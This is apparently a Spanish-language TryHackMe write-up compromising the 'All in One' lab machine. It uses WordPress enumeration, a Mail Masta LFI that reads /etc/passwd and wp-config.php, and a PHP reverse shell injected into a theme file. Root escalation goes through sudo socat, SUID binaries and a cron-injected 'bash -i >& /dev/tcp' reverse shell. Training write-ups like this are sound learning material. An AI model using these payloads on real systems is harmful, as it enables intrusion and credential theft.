---
layout: default
---
![image](../../Imágenes%20Máquinas/ALL_IN_ONE.png)


# ALL IN ONE [TRYHACKME] / Easy
### (Descifrado, Wordpress, Local File Inclusion (LFI), SUID, Crontab, LXD)

#### - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Tenemos varias partes de rootear esta máquina, voy a explicarlas todas.


En primer lugar, como siempre, hacemos el escaneo de nmap, en el cual encontramos 3 puertos abiertos:


![image](../zimages/Pasted_image_20241012210230.png)


Descartamos el FTP porque aunque esté en modo anónimo, es decir que podemos entrar sin contraseña, cuando entramos no hay nada. En su defecto nos vamos a la web, vamos a hacer un escaneo de directorios, en la web principal no hay nada:

![image](../zimages/Pasted_image_20241012210754.png)


Según entramos al directorio "hackathons", ya nos está dando una pista:

![image](../zimages/Pasted_image_20241012211116.png)

Existe un como de cifrado que se llama Vigènere, si miramos el código fuente de la página, vemos que tenemos un texto extraño:

![image](../zimages/Pasted_image_20241012211343.png)

Si nos vamos a la web de cyber chef (https://cyberchef.org) para descifrar esto con Vigènere, nos pide una "key", que en este caso sería "KeepGoing", que es lo más lógico:

![image](../zimages/Pasted_image_20241012211607.png)

Esto nos da una contraseña, la cual usaremos ahora en el otro directorio, "wordpress". Según entramos en este directorio, nos encontramos con un artículo que ha sido escrito por una tal "elyana", la cual podría ser un posible usuario:

![image](../zimages/Pasted_image_20241012212046.png)



# Wp-Scan  (plugin exploit)

Aunque ya tenemos las pistas para entrar en el login de Wordpress, hay otra manera de hacerlo, con la que nos da aún más información de como entrar a la máquina. Siempre que nos encontremos un Wordpress hay que hacer estos escaneos:

```bash
wpscan --url (ip)/wordpress -e u
```

![image](../zimages/Pasted_image_20241012213439.png)

```bash
wpscan --url (ip)/wordpress -e ap
```

![image](../zimages/Pasted_image_20241012213528.png)

El primer escaneo ya nos dió un usuario (que ya estaba en la web principal), y si buscamos por Google los plugins nos da cosas interesantes, vamos a ver cada uno de ellos:

## Mail Masta(Local File Inclusion)

Lo primero que vamos a hacer es buscar el plugin por internet, encontramos un artículo de "exploit-db", que si lo leemos bien, nos aparece una forma de leer archivos del sistema sin ser root: 

```web
http://ip-víctima/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
Como pusimos "passwd", nos aparecen los usuarios:

![image](../zimages/Pasted_image_20241012214540.png)

Vamos a utilizar un wrapper para ver el archivo de configuración de wordpress, "wp-config":

```bash
http://ip-víctima/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```

![image](../zimages/Pasted_image_20241012215331.png)

Nos sale codificado en Base64, lo decodificamos fácilmente:

```bash
echo 'copiamos-todo' | base64 -d > wp-config
```


![image](../zimages/Pasted_image_20241012215607.png)

Nos sale un usuario y una contraseña. Ahora ya podemos entrar en el login de Wordpress con esos datos e ir a template editor:

![image](../zimages/Pasted_image_20241012215804.png)

Nos vamos al footer.php e inyectamos una shell hacia nuestra máquina atacante. Yo utilizo la extensión para firefox de hack-tools:

![image](../zimages/Pasted_image_20241012215947.png)

Nos ponemos a la escucha con NetCat:

```bash
nc -nlvp 441
```
Le damos a update en la web y conseguimos una shell como "www-data":

![image](../zimages/Pasted_image_20241012220049.png)

## Reflex-Gallery

Este plugin en su versión 3.1.3 tiene una vulnerabilidad de Arbitrary File Upload:

![image](../zimages/Pasted_image_20241013170802.png)

igual en metasploit framework, que si ponemos el comando `search reflex gallery` nos aparece esto:

![image](../zimages/Pasted_image_20241013171037.png)

si ponemos `info 0` nos sale lo siguiente:

![image](../zimages/Pasted_image_20241013171108.png)


![image](../zimages/Pasted_image_20241013171116.png)

Ahora vamos a comprobar la versión del plugin en el escaneo de antes:

![image](../zimages/Pasted_image_20241013171239.png)

Es una versión actualizada, nada que hacer en esta parte ya que no funciona el exploit.

# Wordpress (reverse-shell mediante RCE {Remote Code execution})

En wordpress hay un directorio que es el login, vamos a probar a poner wp-login.php como directorio:

![image](../zimages/Pasted_image_20241012212202.png)

En Wordpress hay una vulnerabilidad que te dice si un usuario existe o no, probamos a ver si funciona poniendo elyana y una contraseña aleatoria:

![image](../zimages/Pasted_image_20241012212306.png)

Nos dice que la contraseña es incorrecta, pero nos dice que el usuario Elyana existe. Ahora podríamos hacer un ataque de fuerza bruta, pero tenemos una contraseña que encontramos en el otro directorio, si la probamos vemos que entra:

![image](../zimages/Pasted_image_20241012212746.png)

Ahora que estamos en el panel de admin tenemos mucho poder, podemos realizar un Remote Code Execution (RCE) con un código php malicioso, el cual yo saqué de la extensión hack-tools, que lo saca de pentest monkey:

![image](../zimages/Pasted_image_20241012215804.png)


![image](../zimages/Pasted_image_20241012215947.png)

Antes de darle a "update", nos ponemos a la escucha con netcat:

```bash
nc -nlvp 441
```
Le damos a update y listo, tenemos una shell como www-data:

![image](../zimages/Pasted_image_20241012220049.png)


Ahora que ya hemos visto todas las formas de conseguir una reverse shell, vamos a ver como podemos escalar privilegios hasta ser usuario:

si nos dirigimos al escritorio del usuario "elyana", nos topamos con 2 archivos .txt:

![image](../zimages/Pasted_image_20241013173724.png)

Vemos que solo nos deja leer "hint.txt", nos da una pista que dice que está oculta en el sistema, vamos a ver de que archivos es dueño "elyana":

```bash
find / -user elyana -type f 2>/dev/null | grep -v "Permission" | grep -v "No Such"
```
nos encontramos con este archivo .txt:

![image](../zimages/Pasted_image_20241013174247.png)

vamos a leerlo:

![image](../zimages/Pasted_image_20241013174315.png)

Nos da una contraseña, la cual vamos a usar para cambiar de usuario a elyana con:

```bash
su elyana
```

![image](../zimages/Pasted_image_20241013174404.png)

También podríamos haber entrado mediante ssh, pero de esta manera es más fácil.

Ahora ya podemos leer la flag de user. Vamos a ver como podemos escalar a root:

# Método Sudo -l

Siempre, cuando queremos escalar a root, ponemos este comando

```bash
sudo -l
```
Esto nos muestra los archivos que podemos ejecutar como root, en el caso de esta máquina, nos deja ejecutar /usr/bin/socat:

![image](../zimages/Pasted_image_20241013174709.png)

Vamos a buscarlo por https://gtfobins.github.io:

![image](../zimages/Pasted_image_20241013174829.png)

Ejecutamos el comando y ya somos root:

![image](../zimages/Pasted_image_20241013174853.png)

Nos falta un prompt, pero para eso ejecutamos este comando:

```bash
script /dev/null -c bash
```

![image](../zimages/Pasted_image_20241013175016.png)


# Método SUID
Otro método que siempre se hace para saber que permisos SUID tenemos como un usuario es el siguiente:

```bash
find / -perm -4000 2>/dev/null
```
Nos salen muchos binarios, pero solo 2 nos interesan:

![image](../zimages/Pasted_image_20241013175329.png)


![image](../zimages/Pasted_image_20241013175339.png)

Con la ayuda de gtfobins:

![image](../zimages/Pasted_image_20241013175617.png)

probamos y ya somos root:

![image](../zimages/Pasted_image_20241013175645.png)


# Método Crontab

Otro de los métodos que se suele usar para escalar privilegios es ver los archivos que se ejecutan de forma automática en el sistema, esto lo podemos comprobar con el siguiente comando:

![image](../zimages/Pasted_image_20241013175824.png)

vemos que hay un script que es ejecutado por root cada cierto tiempo en el sistema:

![image](../zimages/Pasted_image_20241013175908.png)

vamos a ver de que se trata:

![image](../zimages/Pasted_image_20241013175933.png)

Vamos a inyectarle un comando de forma que, al ejecutarse automáticamente, nos de una reverse shell como root, utilizaremos el siguiente comando:

```bash
bash -i >& /dev/tcp/(nuestra ip)/(puerto a elegir) 0>&1
```
Lo primero de todo, nos pondremos a la escucha con netcat y ejecutaremos el comando en la máquina víctima poniendo nuestra ip y el puerto que queramos:

![image](../zimages/Pasted_image_20241013180432.png)

Esperamos un rato y lo tenemos:

![image](../zimages/Pasted_image_20241013180514.png)



# ./ROOTED


